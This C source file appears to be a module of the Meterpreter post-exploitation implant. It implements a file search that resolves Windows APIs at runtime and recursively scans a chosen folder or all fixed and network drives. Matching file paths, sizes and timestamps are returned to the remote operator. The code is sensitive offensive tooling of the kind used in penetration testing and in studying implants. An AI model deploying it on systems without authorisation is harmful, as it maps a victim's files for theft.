#include "meterpreter_micro.h"
#include "micro_runtime.h"
#include "micro_stdapi.h"

typedef HANDLE(WINAPI* FindFirstFileWFunction)(LPCWSTR path, LPWIN32_FIND_DATAW data);
typedef BOOL(WINAPI* FindNextFileWFunction)(HANDLE handle, LPWIN32_FIND_DATAW data);
typedef BOOL(WINAPI* FindCloseFunction)(HANDLE handle);
typedef DWORD(WINAPI* GetLogicalDrivesFunction)(VOID);
typedef UINT(WINAPI* GetDriveTypeWFunction)(LPCWSTR root);
typedef BOOLEAN(NTAPI* RtlTimeToSecondsSince1970Function)(PLARGE_INTEGER time, PULONG seconds);
typedef DWORD(WINAPI* ExpandEnvironmentStringsWFunction)(LPCWSTR source, LPWSTR destination, DWORD size);

typedef struct _SearchContext
{
	FindFirstFileWFunction find_first;
	FindNextFileWFunction find_next;
	FindCloseFunction find_close;
	RtlTimeToSecondsSince1970Function to_seconds;
	Packet* response;
	const wchar_t* glob;
	DWORD start_time;
	DWORD end_time;
	BOOL recurse;
} SearchContext;

static MetApi* search_api;

static BOOL search_dots(const wchar_t* name)
{
	return name[0] == L'.' && (name[1] == L'\0' || (name[1] == L'.' && name[2] == L'\0'));
}

static wchar_t* search_join(const wchar_t* base, const wchar_t* name)
{
	SIZE_T base_length = micro_wide_length(base);
	SIZE_T name_length = micro_wide_length(name);
	BOOL separator = base_length > 0 && base[base_length - 1] != L'\\';
	wchar_t* result = (wchar_t*)micro_alloc(search_api, (base_length + name_length + (separator ? 2 : 1)) * sizeof(wchar_t));
	if (result != NULL)
	{
		micro_copy(result, base, base_length * sizeof(wchar_t));
		if (separator)
		{
			result[base_length++] = L'\\';
		}
		micro_copy(result + base_length, name, (name_length + 1) * sizeof(wchar_t));
	}
	return result;
}

static wchar_t* search_expand(const char* path)
{
	ExpandEnvironmentStringsWFunction expand = (ExpandEnvironmentStringsWFunction)micro_resolve(search_api, "kernel32.dll", "ExpandEnvironmentStringsW");
	wchar_t* wide = micro_utf8_to_wide(search_api, path);
	wchar_t* result;
	DWORD required;
	if (wide == NULL || expand == NULL)
	{
		return wide;
	}
	required = expand(wide, NULL, 0);
	result = required == 0 ? NULL : (wchar_t*)micro_alloc(search_api, required * sizeof(wchar_t));
	if (result == NULL || expand(wide, result, required) == 0)
	{
		micro_free(search_api, result);
		result = NULL;
	}
	micro_free(search_api, wide);
	return result;
}

static DWORD search_mtime(SearchContext* context, const FILETIME* time)
{
	LARGE_INTEGER ticks;
	ULONG seconds = 0;
	ticks.HighPart = (LONG)time->dwHighDateTime;
	ticks.LowPart = time->dwLowDateTime;
	if (context->to_seconds != NULL)
	{
		context->to_seconds(&ticks, &seconds);
	}
	return seconds;
}

static DWORD search_emit(SearchContext* context, const wchar_t* base, const WIN32_FIND_DATAW* data)
{
	DWORD modified = search_mtime(context, &data->ftLastWriteTime);
	Packet* group;
	char* path;
	char* name;
	DWORD result;
	if ((context->start_time != 0 && modified < context->start_time) || (context->end_time != 0 && modified > context->end_time))
	{
		return ERROR_SUCCESS;
	}
	group = search_api->packet.create_group();
	path = micro_wide_to_utf8(search_api, base);
	name = micro_wide_to_utf8(search_api, data->cFileName);
	if (group == NULL || path == NULL || name == NULL)
	{
		search_api->packet.destroy(group);
		micro_free(search_api, name);
		micro_free(search_api, path);
		return ERROR_NOT_ENOUGH_MEMORY;
	}
	search_api->packet.add_tlv_string(group, TLV_TYPE_FILE_PATH, path);
	search_api->packet.add_tlv_string(group, TLV_TYPE_FILE_NAME, name);
	search_api->packet.add_tlv_uint(group, TLV_TYPE_FILE_SIZE, data->nFileSizeLow);
	search_api->packet.add_tlv_uint(group, TLV_TYPE_SEARCH_MTIME, modified);
	result = search_api->packet.add_group(context->response, TLV_TYPE_SEARCH_RESULTS, group);
	if (result != ERROR_SUCCESS)
	{
		search_api->packet.destroy(group);
	}
	micro_free(search_api, name);
	micro_free(search_api, path);
	return result;
}

static DWORD search_directory(SearchContext* context, const wchar_t* base, DWORD depth)
{
	wchar_t* match_pattern;
	wchar_t* all_pattern;
	HANDLE handle;
	WIN32_FIND_DATAW data;
	DWORD result = ERROR_SUCCESS;
	if (depth > 64)
	{
		return ERROR_SUCCESS;
	}
	match_pattern = search_join(base, context->glob);
	if (match_pattern == NULL)
	{
		return ERROR_NOT_ENOUGH_MEMORY;
	}
	handle = context->find_first(match_pattern, &data);
	if (handle != INVALID_HANDLE_VALUE)
	{
		do
		{
			if ((data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
			{
				result = search_emit(context, base, &data);
			}
		} while (result == ERROR_SUCCESS && context->find_next(handle, &data));
		context->find_close(handle);
	}
	micro_free(search_api, match_pattern);
	if (!context->recurse || result != ERROR_SUCCESS)
	{
		return result;
	}
	all_pattern = search_join(base, L"*");
	if (all_pattern == NULL)
	{
		return ERROR_NOT_ENOUGH_MEMORY;
	}
	handle = context->find_first(all_pattern, &data);
	if (handle != INVALID_HANDLE_VALUE)
	{
		do
		{
			if ((data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0 && (data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) == 0 && !search_dots(data.cFileName))
			{
				wchar_t* child = search_join(base, data.cFileName);
				if (child == NULL)
				{
					result = ERROR_NOT_ENOUGH_MEMORY;
				}
				else
				{
					result = search_directory(context, child, depth + 1);
					micro_free(search_api, child);
				}
			}
		} while (result == ERROR_SUCCESS && context->find_next(handle, &data));
		context->find_close(handle);
	}
	micro_free(search_api, all_pattern);
	return result;
}

static DWORD search_request(Remote* remote, Packet* packet)
{
	GetLogicalDrivesFunction get_logical_drives = (GetLogicalDrivesFunction)micro_resolve(search_api, "kernel32.dll", "GetLogicalDrives");
	GetDriveTypeWFunction get_drive_type = (GetDriveTypeWFunction)micro_resolve(search_api, "kernel32.dll", "GetDriveTypeW");
	const char* root_value = search_api->packet.get_tlv_value_string(packet, TLV_TYPE_SEARCH_ROOT);
	const char* glob_value = search_api->packet.get_tlv_value_string(packet, TLV_TYPE_SEARCH_GLOB);
	Packet* response = search_api->packet.create_response(packet);
	SearchContext context;
	wchar_t* root = root_value == NULL || root_value[0] == '\0' ? NULL : search_expand(root_value);
	wchar_t* glob = micro_utf8_to_wide(search_api, glob_value == NULL ? "*.*" : glob_value);
	DWORD result = ERROR_SUCCESS;
	micro_zero(&context, sizeof(context));
	context.find_first = (FindFirstFileWFunction)micro_resolve(search_api, "kernel32.dll", "FindFirstFileW");
	context.find_next = (FindNextFileWFunction)micro_resolve(search_api, "kernel32.dll", "FindNextFileW");
	context.find_close = (FindCloseFunction)micro_resolve(search_api, "kernel32.dll", "FindClose");
	context.to_seconds = (RtlTimeToSecondsSince1970Function)micro_resolve(search_api, "ntdll.dll", "RtlTimeToSecondsSince1970");
	context.response = response;
	context.glob = glob;
	context.start_time = search_api->packet.get_tlv_value_uint(packet, TLV_TYPE_SEARCH_M_START_DATE);
	context.end_time = search_api->packet.get_tlv_value_uint(packet, TLV_TYPE_SEARCH_M_END_DATE);
	context.recurse = search_api->packet.get_tlv_value_bool(packet, TLV_TYPE_SEARCH_RECURSE);
	if (response == NULL || glob == NULL || (root_value != NULL && root_value[0] != '\0' && root == NULL))
	{
		result = ERROR_NOT_ENOUGH_MEMORY;
	}
	else if (context.find_first == NULL || context.find_next == NULL || context.find_close == NULL)
	{
		result = ERROR_PROC_NOT_FOUND;
	}
	else if (root != NULL)
	{
		result = search_directory(&context, root, 0);
	}
	else if (get_logical_drives == NULL || get_drive_type == NULL)
	{
		result = ERROR_PROC_NOT_FOUND;
	}
	else
	{
		DWORD drives = get_logical_drives();
		DWORD index;
		for (index = 0; index < 26 && result == ERROR_SUCCESS; index++)
		{
			if ((drives & (1U << index)) != 0)
			{
				wchar_t drive[4] = { (wchar_t)(L'A' + index), L':', L'\\', L'\0' };
				UINT type = get_drive_type(drive);
				if (type == DRIVE_FIXED || type == DRIVE_REMOTE)
				{
					result = search_directory(&context, drive, 0);
				}
			}
		}
	}
	result = response == NULL ? result : search_api->packet.transmit_response(result, remote, response);
	micro_free(search_api, glob);
	micro_free(search_api, root);
	return result;
}

static BOOL search_request_inline(Remote* remote, Packet* packet, DWORD* result)
{
	*result = search_request(remote, packet);
	return TRUE;
}

static Command search_commands[] =
{
	COMMAND_INLINE_REQ(COMMAND_ID_STDAPI_FS_SEARCH, search_request_inline),
	COMMAND_TERMINATOR
};

static MicroExtension search_extension =
{
	sizeof(MicroExtension), MICRO_EXTENSION_ABI_VERSION, "micro-stdapi-fs-search", 1, search_commands, MICRO_EXTENSION_FLAG_INLINE_HANDLERS
};

const MicroExtension* micro_init(MetApi* api, Remote* remote)
{
	(void)remote;
	if (api == NULL || api->packet.create_group == NULL || api->packet.create_response == NULL || api->packet.add_group == NULL || api->packet.add_tlv_string == NULL || api->packet.add_tlv_uint == NULL || api->packet.get_tlv_value_bool == NULL || api->packet.get_tlv_value_string == NULL || api->packet.get_tlv_value_uint == NULL || api->packet.transmit_response == NULL || api->packet.destroy == NULL)
	{
		return NULL;
	}
	search_api = api;
	return &search_extension;
}

DWORD micro_deinit(Remote* remote)
{
	(void)remote;
	search_api = NULL;
	return ERROR_SUCCESS;
}
